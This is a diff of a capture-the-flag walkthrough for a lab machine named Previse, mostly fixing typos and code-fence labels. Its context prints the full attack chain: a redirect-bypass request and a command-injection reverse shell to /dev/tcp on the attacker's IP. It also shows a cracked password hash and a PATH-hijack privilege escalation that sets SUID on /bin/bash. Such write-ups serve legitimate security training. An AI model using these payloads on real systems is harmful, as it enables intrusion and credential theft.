@@ -8,9 +8,7 @@ categories:
 
 ## Enumeration
 
-### nmap
-
-```
+```bash
 PORT   STATE SERVICE REASON  VERSION
 22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
@@ -34,9 +32,7 @@ PORT   STATE SERVICE REASON  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-### ffuf
-
-```
+```bash
 login                   [Status: 200, Size: 2224, Words: 486, Lines: 54]
 files                   [Status: 302, Size: 4914, Words: 1531, Lines: 113]
 header                  [Status: 200, Size: 980, Words: 183, Lines: 21]
@@ -56,17 +52,14 @@ Then I started fuzzing with ffuf to find more pages
 `ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.11.104/FUZZ.php`
 
 `nav.php` is the most useful and shows more pages
-But all require authentification :(
+But all require authentication :(
 
 but we can bypass that with burpsuite
-
 we can see the pages...we request `accounts.php` and change do capture response
-
 change response code from `301 found` (redirect) to `200 Ok` and forward allows us to bypass redirect
-
 Now we create an account to have access
 
-```
+```text
 POST /accounts.php HTTP/1.1
 Host: 10.10.11.104
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -90,7 +83,7 @@ Forward and now we can login as 'nairolf' and start looking around pages
 
 `status.php`
 
-```
+```text
 Check website status:
 
 MySQL server is online and connected!
@@ -109,7 +102,7 @@ we can see newguy uploaded a file `sitebackup.zip` we get that
 
 From the sitebackup.zip we get all php files and from `config.php` we get this
 
-```
+```php
 <?php
 
 function connectDB(){
@@ -130,7 +123,7 @@ In the code of `logs.php` the `exec()` function can give us code execution with 
 
 Capture a log download request in burpsuite
 
-To `delim=comma` we add our shell code wich give us  
+To `delim=comma` we add our shell code which give us
 `delim=comma&bash -c 'exec bash -i &>/dev/tcp/10.10.14.108/2311 <&1'`
 
 we get a shell on netcat
@@ -141,7 +134,7 @@ inside as www-data our actions are limited...we can use credentials from config.
 
 Added an escape `\` to password characters
 
-```
+```bash
 mysql> show tables;
 show tables;
 +-------------------+
@@ -153,7 +146,7 @@ show tables;
 2 rows in set (0.00 sec)
 ```
 
-```
+```bash
 mysql> select _ from accounts;
 select _ from accounts;
 +----+----------+------------------------------------+---------------------+
@@ -173,9 +166,9 @@ Took me alot of time to identify the hash type (google please)...seems like its 
 
 `hashcat '$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.' /usr/share/wordlists/rockyou.txt -m 500`
 
-wich gives us (after some time)
+which gives us (after some time)
 
-```
+```bash
 $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
 
 Session..........: hashcat
@@ -203,19 +196,19 @@ So the credentials are:
 
 Lateral movement
 
-```
+```bash
 su m4lwhere
 Password: ilovecody112235!
 
 m4lwhere@previse:~$
 ```
 
-USER FLAG IS OURS  
+USER FLAG IS OURS
 `cat user.txt`
 
 ## Privilege Escalation
 
-```
+```bash
 sudo -l
 [sudo] password for m4lwhere: ilovecody112235!
 
@@ -227,7 +220,7 @@ uhm...yeah ok a custom script
 
 `cat /opt/scripts/access_backup.sh`
 
-```
+```bash
 #!/bin/bash
 
 # We always make sure to store logs, we take security SERIOUSLY here
@@ -244,24 +237,24 @@ path injecton is possible with gzip execution
 
 FFirst we create a fake gzip binary with SUID and make it executable
 
-```
+```bash
 m4lwhere@previse:/tmp$ echo "chmod +s /bin/bash" > gzip
 m4lwhere@previse:/tmp$ chmod +x gzip
 ```
 
-Export path as we are in tmp folder  
+Export path as we are in tmp folder
 `m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH`
 
-we execute the vulnerable script with sudo wich execute our gzip over true one (PATH priority is from left to right)
+we execute the vulnerable script with sudo which execute our gzip over true one (PATH priority is from left to right)
 
-```
+```bash
 m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh
 [sudo] password for m4lwhere:
 ```
 
-Then we set suid to original /bin/bash wich runs as root now
+Then we set suid to original /bin/bash which runs as root now
 
-```
+```bash
 m4lwhere@previse:/tmp$ ls -la /bin/bash
 -rwsr-sr-x 1 root root 1113504 Jun 6 2019 /bin/bash
 m4lwhere@previse:/tmp$ bash -p
@@ -270,7 +263,7 @@ bash-4.4#
 
 the last part was tricky so note that I googled before doing it
 
-```
+```text
 -p Turned on whenever the real and effective user ids do not match.
 Disables processing of the $ENV file and importing of shell
 functions. Turning this option off causes the effective uid and
@@ -279,7 +272,7 @@ gid to be set to the real uid and gid.
 
 Now we are root
 
-```
+```bash
 bash-4.4# cd /root
 bash-4.4# ls
 root.txt
